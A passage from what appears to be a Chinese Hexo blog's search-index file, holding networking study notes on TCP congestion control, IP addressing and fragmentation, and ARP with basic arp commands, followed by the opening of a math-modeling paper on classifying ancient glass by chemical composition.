id="拥塞控制的作用："><a href="#拥塞控制的作用：" class="headerlink" title="拥塞控制的作用："></a>拥塞控制的作用：</h5><img src=".\传输协议UDP与TCP\拥塞控制.png" style="zoom:50%;" /><h5 id="拥塞控制方法"><a href="#拥塞控制方法" class="headerlink" title="拥塞控制方法"></a>拥塞控制方法</h5><blockquote><p style="color:black;">慢开始:        初始设置拥塞窗口cwnd = 1，每收到一个对新的报文段的确认后，将拥塞窗口加1，逐步增大发送端的拥塞窗口cwnd。</p></blockquote><blockquote><p style="color:black;">拥塞避免:    使拥塞窗口cwnd按线性规律缓慢增长，“加法增大”。</p></blockquote><img src=".\传输协议UDP与TCP\慢开始于拥塞避免.png" style="zoom:50%;" /><blockquote><p style="color:black;">快重传:接收方每收到一个失序的报文段后就立即发出重复确认，这样做可以让发送方及早知道有报文段没有到达接收方。发送方只要一连收到三个重复确认就应当立即重传对方尚未收到的报文段。</p></blockquote><img src=".\传输协议UDP与TCP\快重传.png" style="zoom:50%;" /><blockquote><p style="color:black;">快恢复:当发送端收到连续三个重复的确认时，就执行“乘法减小”算法，把慢开始门限ssthresh 减半，但接下去不执行慢开始算法，而是执行拥塞避免算法“加法增大”，使拥塞窗口缓慢地线性增大，实现快恢复。</p></blockquote><img src=".\传输协议UDP与TCP\快恢复.png" style="zoom:50%;" /><h5 id="发送窗口大小"><a href="#发送窗口大小" class="headerlink" title="发送窗口大小:"></a>发送窗口大小:</h5><p>考虑拥塞控制的情况下，窗口大小由接收窗口和拥塞窗口两者中的较小者决定。接收窗口大小由接收方发送的确认报文中的窗口大小字段值所确定。这是接收端在缓存溢出导致数据被丢弃之前所能接受的最大字节数。拥塞窗口大小是由网络根据拥塞情况而确定的。<br>发送窗口的上限值= Min [rwnd, cwnd]</p><blockquote><ul><li><p>当rwnd &lt; cwnd时，是接收方的接收能力限制发送窗口的最大值</p></li><li><p>当cwnd &lt; rwnd时，则是网络的拥塞限制发送窗口的最大值。</p></li></ul></blockquote><h4 id="差错控制："><a href="#差错控制：" class="headerlink" title="差错控制："></a>差错控制：</h4><h5 id="TCP的差错控制"><a href="#TCP的差错控制" class="headerlink" title="TCP的差错控制"></a>TCP的差错控制</h5><ul><li>应用程序把数据流交付给TCP后，就依靠TCP把整个数据流交付给接收端的应用程序，并且保证数据流是按序的、没有差错的、也没有任何一部分是丢失的或重复的。</li><li>TCP使用差错控制提供可靠性。差错控制包括以下的一些机制:检测受到损伤的报文、丢失的报文、失序的报文和重复的报文。</li></ul><blockquote><p style="color:blue;">实现方式：通过校验和、确认以及超时重传三种机制实现</p></blockquote><ul><li><p>校验和:用来检验报文是否出错，如果出错，接收端就将报文丢弃</p></li><li><p>确认</p><ul><li>累积确认：不必对收到的分组逐个发送确认，而是对按序到达的最后一个分组发送确认</li><li>选择确认：首部选项SACK用于报告收到的不连续的字节块的边界</li><li>确认报文不携带数据，但消耗一个序号。除了ACK报文之外，确认报文也需要被确认。</li></ul></li><li><p>重传</p><ul><li>超时计时器到时:发送端为每一个TCP报文段都设置一个超时计时器，若计时器到时仍没收到确认，就重传这个报文。超时计时器的值是动态的，根据报文的往返时间而更新</li><li>快重传:发送端只要一连收到三个重复的ACK即可断定有报文段丢失了，就应立即重传而不必等待计时器超时。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网际协议IP</title>
      <link href="/2022/11/12/%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AEIP/"/>
      <url>/2022/11/12/%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AEIP/</url>
      
        <content type="html"><![CDATA[<h2 id="网际协议IP"><a href="#网际协议IP" class="headerlink" title="网际协议IP"></a>网际协议IP</h2><p>[TOC]</p><h3 id="IP协议简介（lP-Internet-Protocol）"><a href="#IP协议简介（lP-Internet-Protocol）" class="headerlink" title="IP协议简介（lP- Internet Protocol）"></a>IP协议简介（lP- Internet Protocol）</h3><ul><li>网际协议IP是TCP/IP最核心的协议，也是最重要的因特网标准协议之一</li><li>IP负责将数据包从源点交付到终点，所有的TCP、UDP、ICMP及IGMP数据都以IP数据报格式传输。</li></ul><h4 id="IP的特性："><a href="#IP的特性：" class="headerlink" title="IP的特性："></a>IP的特性：</h4><blockquote><p style="color:blue;">不可靠:不保证分组成功地送到目的站。任何可靠性的要求必须由上层协议实现。</p></blockquote><blockquote><p style="color:orange;">无连接:IP并不维护任何后续分组的状态信息，每个分组都是相互独立的</p></blockquote><blockquote><p style="color:red;">尽最大努力交付:IP协议尽力发送每个分组，只有当资源用完或网络出现故障时才会发送失败</p></blockquote><h4 id="IP地址及表示方法："><a href="#IP地址及表示方法：" class="headerlink" title="IP地址及表示方法："></a>IP地址及表示方法：</h4><p>IP地址：一个IP地址惟一地标识了Internet上的一台主机，IPv4协议使用32位地址，这表示地址空间是2^32。而IPv6协议使用128位地址，地址空间为2^128。<br>表示方法：点分十进制表示:每个字节用一个十进制数表示。</p><img src="./网际协议IP/IP地址分类.png"/><h5 id="网络号："><a href="#网络号：" class="headerlink" title="网络号："></a>网络号：</h5><p>D类地址和E类地址不划分网络号和主机号。</p><img src="./网际协议IP/网络号.png" style="zoom:67%;" /><h5 id="特殊的IP地址："><a href="#特殊的IP地址：" class="headerlink" title="特殊的IP地址："></a>特殊的IP地址：</h5><blockquote><p style="color:blue;">网络地址:主机号全0的IP地址，不分配给任何主机，作为网络本身的标识</p></blockquote><blockquote><p style="color:orange;">广播地址:主机号为全1的IP地址，用作广播地址，目的地址为广播地址的数据包传递给该网络中的所有节点</p></blockquote><blockquote><p style="color:skyblue;">有限广播地址:32位为全“1”的IP地址(255.255.255.255)，通常由无盘工作站启动时使用，希望从网络IP地址服务器处获得一个IP地址</p></blockquote><blockquote><p style="color:red;">主机本身地址:32位全“0”的IP地址(0.0.0.0)称为主机本身地址</p>- 当一个主机要获得其IP地址时，可以运行一个引导程序，并发送一个以全0为源地址、以全1为目的地址的分组给引导服务器，以获得本主机的IP地址。</blockquote><blockquote><p style="color:black;">环回地址:27.0.0.1称为回环地址，可用来测试TCP/IP协议是否正常工作，常用于本机上软件测试和本机上网络应用程序之间的通信地址。</p>- 使用回送地址发送数据，协议软件立即返回，不进行任何网络传输。</blockquote><h5 id="专用IP地址："><a href="#专用IP地址：" class="headerlink" title="专用IP地址："></a>专用IP地址：</h5><p>专用lIP地址:仅用于专用网内部的本地主机。<br>大多数路由器不转发携带专用IP地址的数据包，本地主机必须经网络地址转换服务器才能访问Internet。<br>专用IP地址范围: </p><img src="./网际协议IP/专用IP地址.png" style="zoom:67%;" /><h4 id="子网划分："><a href="#子网划分：" class="headerlink" title="子网划分："></a>子网划分：</h4><p><strong>Subnetting</strong><br>提高IP空间的利用率，增加IP分配的灵活性。<br>从主机号借用若干个比特作为子网号subnet-id，而主机号host-id也就相应减少若干个比特</p><p><img src="./%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AEIP/%E5%AD%90%E7%BD%91%E5%88%92%E5%88%86%E7%A4%BA%E6%84%8F%E5%9B%BE.png"></p><h4 id="子网掩码："><a href="#子网掩码：" class="headerlink" title="子网掩码："></a>子网掩码：</h4><blockquote><p style="color:blue;">子网掩码是一个网络号全1，主机号全0的32位二进制数，用于确定P中有多少位用于子网号。</p>- **~~表示方法~~**：点分十进制，IP地址后用`/`后面写明网络号的位数- 子网掩码与IP地址**按位做与**得到IP地址对应的**网络地址**</blockquote><h3 id="IP数据格式："><a href="#IP数据格式：" class="headerlink" title="IP数据格式："></a>IP数据格式：</h3><p><img src="./%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AEIP/IP%E7%9A%84%E6%8A%A5%E6%96%87%E6%A0%BC%E5%BC%8F.png"></p><p>IP数据报由首部和数据两部分组成</p><h4 id="各字段的含义："><a href="#各字段的含义：" class="headerlink" title="各字段的含义："></a>各字段的含义：</h4><p>版本:4 bit，指IP协议的版本，目前的IP协议版本号为4(即IPv4)</p><p>首部长度:4 bit，以4字节为单位，因此IP的首部长度最大是60字节</p><p>服务类型: 8 bit，区分服务，一般不用。</p><p>总长度: 16 bit，首部和数据之和的长度，单位为字节，因此数据报的最大长度为65535字节。总长度不能超过网络的最大传输单元MTU。</p><p>标识:16 bit，数据报计数器</p><blockquote><p>IP软件在存储器中维持一个计数器，每产生一个数据报，计数器加1，并将此值赋给标识字段。<br>当数据报由于长度超过网络MTU而必须分片时，标识字段的值就被复制到所有的数据报分片的标识字段中。<br>相同的标识字段的值使分片后的各数据报片能正确重组成原来的数据报。</p></blockquote><p>标志: 3 bit，目前只有两位有意义</p><blockquote><ul><li>第一位保留。</li><li>中间一位记为DF，为不分片标志，只有当DF=0时才允许分片。</li><li>最后一位为MF，MF=1表示后面还有分片，MF=O表示这是最后一个数据报片。</li></ul></blockquote><p>偏移量:13 bit，较长的分组被分片后，某分片在原分组中的相对位置。片偏移以8个字节为单位。每个分片的长度必须是8的整数倍。</p><p>生存时间:8 bit，记为TTL (Time To Live)</p><blockquote><ul><li><p>表明数据报在网络中的寿命，其单位为秒。现在TTL的单位是跳数，指明数据报在因特网中至多可经过多少个路由器，最大值为255，通常为32、64、128。</p></li><li><p>当TTL值为1时，表示这个数据报只能在本局域网内传送，因为这个数据报传送到局域网上的某个路由器，在被转发之前TTL值就减小到0，因而会被路由器丢弃。</p></li></ul></blockquote><p>协议: 8 bit，指出此数据报携带的数据使用何种协议，以便目的主机的IP层将数据部分上交给对应的进程处理。</p><p><img src="./%E7%BD%91%E9%99%85%E5%8D%8F%E8%AE%AEIP/IP%E7%9A%84%E9%AB%98%E5%B1%82%E5%8D%8F%E8%AE%AE.png"></p><p>首部检验和:16 bit，检验数据报的首部，不包括数据部分。采用简单的16位反码求和的计算方法。</p><p>源IP地址: 32bit，定义了源主机的IP地址。在IP数据包从源主机传送到目的主机期间，该字段保持不变。</p><p>目的IP地址: 32bit，定义了目的主机的IP地址。在IP数据报从源主机传送到目的主机期间，该字段保持不变。</p><h3 id="IP数据报分片："><a href="#IP数据报分片：" class="headerlink" title="IP数据报分片："></a>IP数据报分片：</h3><p>数据包可能经过多个不同的网络，每一个路由器把收到的帧进行拆装，处理后又封装成另一个帧。<br>收到帧的格式与长度取决于这个帧刚经过的物理网络所使用的协发<br>送出去的帧的格式与长度取决于这个帧将要经过的物理网络所使用的协议。</p><p><strong>最大传输单元MTU</strong>：不同网络所能传送的数据包的最大长度是不同的，这个最大长度叫做最大传输单元MTU ( Maximum Transmission Unit ) </p><blockquote><p style="color:orange;">MTU即该网络的数据链路层帧的数据部分的最大长度。</p></blockquote><h4 id="分片："><a href="#分片：" class="headerlink" title="分片："></a>分片：</h4><blockquote><ul><li><p>对于物理网络，如果数据包的长度超过了MTU，就要把数据部分进行分片。</p></li><li><p>每个分片都有自己的首部。</p></li><li><p>如果已经分片的数据包要经过更小MTU的网络，那么这些已经分片的数据包还可再进行分片，数据包在到达最后终点之前可以经过多次的分片。</p></li><li><p style="color:red;">数据包可以被源主机或在其路径上的路由器进行分片，但是数据包的重装只能在目的主机上进行。</p></li></ul></blockquote><h4 id="重组"><a href="#重组" class="headerlink" title="重组"></a>重组</h4><h5 id="目的主机进行分片重组"><a href="#目的主机进行分片重组" class="headerlink" title="目的主机进行分片重组"></a>目的主机进行分片重组</h5><blockquote><p style="color:blue;">IP规定，数据报分片的重组地点是目的主机，中间路由器不对任何被分片的数据报进行重组，即使其转发接口的MTU非常大。</p></blockquote><blockquote><p>优点:<br>简化了路由软件的操作，提高了路由器的处理效率。<br>可以避免重复分片。在数据报投递过程中，途经网络的MTU是不可预知的</p></blockquote><blockquote><p>缺点<br>浪费带宽。因为每个分片都要有一个首部，分片越多，首部开销越大。<br>增加了数据包丢失的可能性。分片越多，丢失的可能性越大。一旦丢失了一个分片，整个数据报就必须重新传输。</p></blockquote><h5 id="分片重组："><a href="#分片重组：" class="headerlink" title="分片重组："></a>分片重组：</h5><p>有关的三个字段是:标识字段、标志字段和偏移量字段。</p><p>当目的主机收到一个数据报时，可以根据偏移量和MF位判断:</p><ul><li>片偏移不为0，表明它是一个分片;</li><li>如果片偏移为0，且MF位为1，表明它是第一个分片;</li><li>如果片偏移为0，且MF位为0，则表明它是一个完整的数据报。</li></ul><p>根据数据报首部“标识”字段的值，可判断哪些分片属于同一个原始数据报片偏移用来确定分片在原始数据报中的位置。</p><h5 id="重组定时器："><a href="#重组定时器：" class="headerlink" title="重组定时器："></a>重组定时器：</h5><p>为防止因等待一个丢失的分片而无限期延长重组过程，在重组分片时启动一个定时器,如果超时后仍然没有收到一个数据报的全部分片，则该数据报被丢弃。<br>IP数据报校验和：</p><blockquote><p style="color:blue;">校验和：数据包上的附加信息，能够识别数据包在传输过程中是否出错。</p></blockquote><p>发送端先计算校验和，并把得到的结果与数据包一起发送出去。接收端对数据包进行同样的计算。若结果正确，则接受这个数据包，否则就丢弃它。</p><h4 id="校验和的计算："><a href="#校验和的计算：" class="headerlink" title="校验和的计算："></a>校验和的计算：</h4><p>发送端：将数据包按16位分段。把这些段用反码算术运算相加，将相加后得到的和再取反码就得出了校验和。<br>接收端：把收到的数据包按16位分段，并把这些段相加。得到的和取反码。若结果为0，则接受这个数据包，否则拒绝这个数据包。</p><img src="./网际协议IP/校验计算.png" style="zoom: 50%;" /><h4 id="说明："><a href="#说明：" class="headerlink" title="说明："></a>说明：</h4><blockquote><blockquote><p style="color:blue;">IP数据包的校验和只校验IP首部部分而不校验IP数据部分。</p></blockquote><ul><li>首先，所有将数据封装在IP数据报中的高层协议，都有覆盖整个数据包的校验和。因此，IP数据报的校验和就不必再检验所封装的数据部分。</li><li>其次，每经过一个路由器，IP数据包的首部就要改变一次，但数据部分不改变。因此若校验和包含数据部分，这就意味着路由器要花费很多时间计算没有改变的数据部分的校验和。</li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议分析 </tag>
            
            <tag> IP协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>地址解析协议 ARP</title>
      <link href="/2022/11/12/%E5%9C%B0%E5%9D%80%E8%A7%A3%E6%9E%90%E5%8D%8F%E8%AE%AEARP/"/>
      <url>/2022/11/12/%E5%9C%B0%E5%9D%80%E8%A7%A3%E6%9E%90%E5%8D%8F%E8%AE%AEARP/</url>
      
        <content type="html"><![CDATA[<h2 id="地址解析协议-ARP"><a href="#地址解析协议-ARP" class="headerlink" title="地址解析协议 ARP"></a>地址解析协议 ARP</h2><p>[TOC]</p><h3 id="ARP的定义与基本功能"><a href="#ARP的定义与基本功能" class="headerlink" title="ARP的定义与基本功能"></a>ARP的定义与基本功能</h3><ul><li><p>掌握ARP协议的报文格式</p></li><li><p>掌握ARP协议的工作原理</p></li><li><p>理解ARP高速缓存的作用</p></li><li><p>掌握ARP缓存表的维护过程</p></li></ul><p><strong>ARP</strong>(Address Resolution Protocol，RFC 826）是根据IP地址获取物理地址的一个TCP/IP协议。主机通过将ARP请求<strong>广播</strong>到网络上的所有主机并接收返回消息来确定目标IP地址的物理地址，同时将IP地址和硬件地址存入本机ARP缓存中，下次请求时直接查询<strong>ARP缓存</strong>。</p><h4 id="物理地址："><a href="#物理地址：" class="headerlink" title="物理地址："></a>物理地址：</h4><p>物理地址通常是由硬件来实现的，例如以太网的物理地址被写入到网卡中，任何一块网卡的物理地址是唯一的</p><blockquote><p style="color:blue;">物理地址的长度和格式取决于具体的网络，以太网的物理地址是6字节地址物理地址可以是单播地址、多播地址或广播地址。</p></blockquote><h4 id="逻辑地址："><a href="#逻辑地址：" class="headerlink" title="逻辑地址："></a>逻辑地址：</h4><p>逻辑地址与物理设备本身没有关联, 逻辑地址可以是单播地址、多播地址和广播地址。</p><blockquote><p style="color:skyblue;">目前Internet上的IPv4协议逻辑地址是32位的IP地址， IPv6地址有128位长</blockquote><h4 id="地址解析"><a href="#地址解析" class="headerlink" title="地址解析:"></a>地址解析:</h4><p>逻辑地址是在网络层使用的，但数据包是在物理网络传递。主机或路由器是通过物理地址来识别的,因此将一个数据包传递到一个主机或路由器要进行寻址，需要将一个逻辑地址映射到相应的物理地址。</p><blockquote><p style="color:blue;">地址解析就是主机在发送帧前将目的逻辑地址转换成目的物理地址的过程。</p></blockquote><h5 id="静态映射"><a href="#静态映射" class="headerlink" title="静态映射:"></a>静态映射:</h5><p>手工创建IP地址与物理地址的映射关系，建立映射表。当已知IP地址时，通过查找映射表得到对应的物理地址。</p><blockquote><p style="color:orange;">局限性: 主机更换了网卡，也就改变了主机的物理地址。当主机从一个网络移到另一个网络时，物理地址没变，但IP地址改变了。·要适应这些变化，会增大维护静态映射表的开销。</p></blockquote><h5 id="用协议实现地址映射："><a href="#用协议实现地址映射：" class="headerlink" title="用协议实现地址映射："></a>用协议实现地址映射：</h5><p>在使用TCP/IP协议的以太网中，<strong>ARP</strong>(Address Resolution Protocol)协议完成将IP地址映射到MAC地址的过程，逆地址解析协议<strong>RARP</strong>(Reverse Address Resolution Protocol)将物理地址映射为IP地址</p><h3 id="ARP的报文格式："><a href="#ARP的报文格式：" class="headerlink" title="ARP的报文格式："></a>ARP的报文格式：</h3><img src="D:\blog\shierjinghuang\source\_posts\地址解析协议ARP\ARP的报文格式.png"  /><p style="color:blue; text-indent: 112px;">硬件类型:16bit，定义运行ARP的网络类型，如以太网的硬件类型是1。</p><p style="color:blue; text-indent: 112px;">协议类型:16bit，定义使用ARP的高层协议，如对于IPv4协议，该字段的值是Ox0800。</p><p style="color:blue; text-indent: 112px;">硬件长度:8bit，以字节为单位的物理地址长度，如以太网硬件地址长度为6。</p><p style="color:blue; text-indent: 112px;">协议长度:8bit，以字节为单位的逻辑地址的长度，对于IPv4，该字段为4。<p><p style="color:blue; text-indent: 112px;">操作码:16bit,1表示ARP请求，2表示ARP应答。</p><p style="color:blue; text-indent: 112px;">发送端硬件地址:变长字段，对于以太网该字段长度是6字节</p><p style="color:blue; text-indent: 112px;">发送端逻辑地址:变长字段，对于IPv4地址，该字段长度为4字节。</p><p style="color:rgb(255, 118, 0); text-indent: 112px;">目的端硬件地址:变长字段，对于ARP请求报文，该字段全为0</p><p style="color:blue; text-indent: 112px;">目的端逻辑地址:变长字段，定义目标逻辑地址。</p><p style="color:black;">ARP数据报直接封装在数据链路层的帧中</p><img src="D:\blog\shierjinghuang\source\_posts\地址解析协议ARP\ARP封装.png" style="zoom:80%;" /><h3 id="ARP的运行过程："><a href="#ARP的运行过程：" class="headerlink" title="ARP的运行过程："></a>ARP的运行过程：</h3><h4 id="数据包传输步骤"><a href="#数据包传输步骤" class="headerlink" title="数据包传输步骤"></a>数据包传输步骤</h4><blockquote><ul><li>发送端知道目的端的IP地址。</li><li>IP要求ARP创建一个ARP请求报文，其中包含了发送方的物理地址、发送方的IP地址和目的端的IP地址。目的端的物理地址用0填充</li><li>将报文传递到数据链路层，并在该层中用<strong>发送方的物理地址作为源地址</strong>，<strong>用物理广播地址作为目的地址</strong>，将其封装在一个帧中。</li><li>因为该帧中包含了一个<strong>广播</strong>目的地址，所以同一链路中的每个主机或路由器都接收到这个帧。所有接收到该帧的主机都将其传递到ARP层进行处理。<strong>除了目的端主机以外的所有主机都丢弃该报文</strong>。</li><li>目的主机用一个包含其物理地址的ARP应答报文<strong>单播</strong>做响应。</li><li>发送方接收到这个应答报文，这样它就知道了目标主机的物理地址。</li><li>将IP数据报封装在一个帧中，并单播到目的地址。</li></ul></blockquote><h3 id="ARP高速缓存："><a href="#ARP高速缓存：" class="headerlink" title="ARP高速缓存："></a>ARP高速缓存：</h3><p>当主机A通过ARP请求得到B的物理地址后就将“IP地址—MAC地址”的绑定信息存储在<strong>高速缓存</strong>中。对于后续发往E的分组，可以通过缓存得到物理地址<br>当ARP被询问一个已知IP地址节点的MAC地址时，先在ARP缓存表查看，若存在，就直接返回MAC地址，若不存在，才发送ARP请求向局域网查询。</p><h4 id="缓存表内容："><a href="#缓存表内容：" class="headerlink" title="缓存表内容："></a>缓存表内容：</h4><p>静态项目一直保留在缓存中，直到重新启动计算机为止。</p><p>动态项目随时间推移自动添加和删除，每个动态ARP缓存项的潜在生命周期是10分钟。<br>新加到缓存中的项目带有时间戳，如果某个项目添加后2分钟内没有再使用，则此项目过期并从ARP缓存中删除;<br>如果某个项目已在使用，则又收到2分钟的生命周期;<br>如果某个项目始终在使用，则会另外收到2分钟的生命周期，一直到10分钟的最长生命周期。</p><h4 id="arp命令的用法"><a href="#arp命令的用法" class="headerlink" title="arp命令的用法:"></a>arp命令的用法:</h4><p>arp命令用于对本地arp缓存进行操作，不会发送ARP请求</p><blockquote><ul><li>arp -a:              列出ARP缓存中的所有条目</li><li>arp -a ip:          列出缓存中与ip对应的条目</li><li>arp -d:              清空arp缓存</li><li>arp -d ip:          删除缓存中与ip对应的条目</li><li>arp -s ip mac : 在arp缓存中添加一个静态arp条目</li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议分析 </tag>
            
            <tag> ARP协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>古代玻璃制品的成分分析与鉴别</title>
      <link href="/2022/11/01/%E5%9B%BD%E8%B5%9B%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/"/>
      <url>/2022/11/01/%E5%9B%BD%E8%B5%9B%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="古代玻璃制品的成分分析与鉴别"><a href="#古代玻璃制品的成分分析与鉴别" class="headerlink" title="古代玻璃制品的成分分析与鉴别"></a>古代玻璃制品的成分分析与鉴别</h2><p>[TOC]</p><h3 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h3><p>本文基于一批我国古代玻璃制品的相关数据进行了古代玻璃制品的成分分析与鉴别，建立了古代玻璃制品鉴别模型，对各问题进行了分析。</p><p>对于问题一，针对玻璃文物的表面风化与玻璃类型、纹饰和颜色是否具有关系的问题，计算玻璃类型、颜色、纹饰与表面风化的斯皮尔曼系数，分析相关性，得到结论“表面风化和玻璃类型关系最大，和玻璃颜色与纹饰的关系不大”。为预测其风化前的化学成分含量，通过分析文物表面风化前后化学成分含量变化的统计学规律，结合聚类分析及多项式曲线拟合，对风化前数据进行了预测，预测详情数据见支撑材料。</p><p>对于问题二，首先，为得出高钾玻璃和铅钡玻璃的分类规律，将无风化的高钾和铅钡玻璃各化学成分含量的均值曲线进行对比，采用统计学方法分析得出高钾玻璃、铅钡玻璃的分类规律。其次，为解决高钾玻璃和铅钡玻璃的亚类划分问题，运用SPSS工具，采用聚类分析法，依据各样本每种化学成分含量与其他样本各化学成分含量之间的联系进行聚类。聚类完成后再加以统计学分析，寻找其聚为一类的原因并从中提炼分类特征。最终聚类结果为：高钾玻璃分3类，分别为低铅钡玻璃、高磷玻璃、高铜玻璃；铅钡玻璃分5类，分别为高磷玻璃、高钠玻璃、高铝玻璃、钙铁玻璃、高铜玻璃。之后通过计算轮廓系数分析得到模型的合理性，并通过增添样本衡量分类结果的敏感性。</p><p>对于问题三，在对附件表单3中未知类别玻璃文物的化学成分进行分析时先将数据分为无风化和风化，之后经由表单2按照风化、无风化的标准通过箱图、散点图进行数据分析找出适合做自变量的化学成分，确定自变量和因变量从而建立多元回归模型。通过SPSS并依据建立的模型确定影响较高的化学成分进而推测其所属类型。可知高钾玻璃分别是A1、A4、A6、A7，铅钡玻璃分别是A2、A3、A5、A8。在敏感性分析上，更改各项系数中的一项，取附录2中数据代入计算，原计算结果与新数据的变化很明显，数据显著性很强。</p><p>对于问题四，针对不同类别的玻璃文物样品，使用灰色关联分析法分析其化学成分之间的关联关系，得出不同种类的玻璃所含化学成分的关联系数并对其进行排序。通过对不同玻璃类型的数据进行灰色关联分析，得到几组不同的关系系数列表，通过各个关系系数列表的对比，体现不同种类玻璃化学成分关联关系的差异性。</p><p>关键词：<strong>多元回归</strong> <strong>斯皮尔曼系数</strong> <strong>聚类分析</strong> <strong>灰色关联分析</strong> </p><h3 id="一、问题重述"><a href="#一、问题重述" class="headerlink" title="一、问题重述"></a>一、问题重述</h3><h4 id="1-1问题背景"><a href="#1-1问题背景" class="headerlink" title="1.1问题背景"></a>1.1问题背景</h4><p>玻璃的出现与使用在人类的生活里已有四千多年的历史，早期的玻璃在西亚和埃及地区常被制作成珠形饰品。历史上古代玻璃经由丝绸之路传入我国，我国古代玻璃吸收其技术后在本土就地取材制作，因此与外来的玻璃制品外观相似，但化学成分却不相同。从西周到两汉时期中国境内玻璃制品化学成分的演变有自己独特的发展脉络，研究不同时期古代玻璃组成成分，对于了解古代金属冶炼技术与古代丝绸之路等有重大意义。</p><p>在长期的风化过程中，内部的各种氧化物与环境中的各种元素之间存在大量的物理和化学反应，一些组成元素的交换导致其组成比例的变化，这将影响对其类别的正确判断。</p><h4 id="1-2-具体问题重述"><a href="#1-2-具体问题重述" class="headerlink" title="1.2 具体问题重述"></a>1.2 具体问题重述</h4><p>现有一批我国古代玻璃制品的相关数据，考古工作者现已将其分为高钾玻璃和铅钡玻璃两种类型。</p><p>问题一：建立模型确定玻璃文物的表面风化与玻璃类型、纹饰和颜色是否具有关联关系，并根据玻璃类型分析文物表面风化前后化学成分含量变化的统计规律。根据风化点的检测数据，建立预测模型，预测该文物风化前各化学成分的所占比例。</p><p>问题二：由附件表单2中的数据分析高钾玻璃和铅钡玻璃的分类规则；对于每个类别，通过聚类分析选择合适的化学成分来划分其子类，给出具体的分类方法和划分结果，并分析划分结果的合理性和敏感性。</p><p>问题三：对附件表单 3 中未知类别玻璃文物的化学成分分析，鉴别其类型，并对分类结果的敏感性进行分析。</p><p>问题四：分析不同类型的玻璃样品化学组成之间的关联，比较不同类别玻璃文物样品之间关联关系的差异。</p><h3 id="二、问题分析"><a href="#二、问题分析" class="headerlink" title="二、问题分析"></a>二、问题分析</h3><h4 id="2-1对问题一的分析"><a href="#2-1对问题一的分析" class="headerlink" title="2.1对问题一的分析"></a>2.1对问题一的分析</h4><h5 id="2-1-1表面风化与玻璃类型、纹饰和颜色的关系"><a href="#2-1-1表面风化与玻璃类型、纹饰和颜色的关系" class="headerlink" title="2.1.1表面风化与玻璃类型、纹饰和颜色的关系"></a>2.1.1表面风化与玻璃类型、纹饰和颜色的关系</h5><p>分析表面风化与玻璃类型、纹饰和颜色的关系是经典的相关性分析，可以通过皮尔逊系数或斯皮尔曼系数分析相关性。皮尔逊系数进行关联性分析需要呈正态分布且是线性关系的连续变量，而玻璃类型、纹饰、颜色均为定类，而非定量故选择斯皮尔曼系数分析相关性。</p><h5 id="2-1-2文物样品表面有无风化化学成分含量的统计规律"><a href="#2-1-2文物样品表面有无风化化学成分含量的统计规律" class="headerlink" title="2.1.2文物样品表面有无风化化学成分含量的统计规律"></a>2.1.2文物样品表面有无风化化学成分含量的统计规律</h5><p>本文通过聚类分析，将14种不同变量进行聚类，并结合聚类结果，使用多项式曲线拟合，通过对不同指标的关系对风化前的化学成分利用构建的以小二乘法为思路的多元函数表达式进行求解。</p><p>经过数据处理后，可以发现高钾玻璃风化前后化学成分变化具有明显相关性，而铅钡玻璃则不具有明显相关性而无法使用多元线性回归模型求解。</p><p>继续通过多元线性回归模型预测高钾玻璃风化前数据，通过聚类结果并结合统计学规律预测铅钡玻璃风化前成分。</p><h4 id="2-2对问题二的分析"><a href="#2-2对问题二的分析" class="headerlink" title="2.2对问题二的分析"></a>2.2对问题二的分析</h4><p>要从化学成分含量角度分析高钾玻璃、铅钡玻璃的分类规律应建立在玻璃无风化、化学成分含量未被破坏的前提下，根据无风化状态下不同类型玻璃化学成分含量分布曲线，将无风化的高钾和铅钡玻璃各化学成分含量的均值曲线进行对比，分析得出高钾玻璃、铅钡玻璃的分类规律。 </p><p>根据化学成分进行亚分类是一个聚类问题，事先并不知道要分为多少类，我们考虑使用系统聚类法，将各样本作为聚类对象，依据其每种化学成分含量与其他样本各化学成分含量之间的联系进行聚类。系统聚类完成后得出初步聚类结果，而后加以统计学分析，从化学成分含量的角度找出各聚类组合之所以聚为一类的原因，对于一些规律不很明显的组合适当进行人工干预重新组合，提炼出分类特征从而形成类标签，实现基于化学成分的亚类划分。之后通过计算轮廓系数分析得到模型的合理性，并通过增添测试数据衡量分类的敏感性。</p><h4 id="2-3对问题三的分析"><a href="#2-3对问题三的分析" class="headerlink" title="2.3对问题三的分析"></a>2.3对问题三的分析</h4><p>在判别玻璃文物类型前，先将数据划分为无风化的未知类别玻璃文物数据和风化的未知类别玻璃文物数据，之后对表单2的数据规律按照风化和无风化进行总结，找到适合作为自变量的化学成分，确定自变量和因变量从而建立多元回归模型。</p><p>建立回归模型后再通过给予的未知类别玻璃文物数据计算出的预测结果并根据总结出来的数据规律判别是该化学成分属于高钾玻璃还是铅钡玻璃，最后根据哪一种类型可能性更大来决定该未知类别玻璃文物所属类型。</p><p>敏感性分析上更改各项系数中的一项，取附录2中数据代入计算，原计算结果与新数据的变化很明显，数据显著性很强。</p><h4 id="2-4对问题四的分析"><a href="#2-4对问题四的分析" class="headerlink" 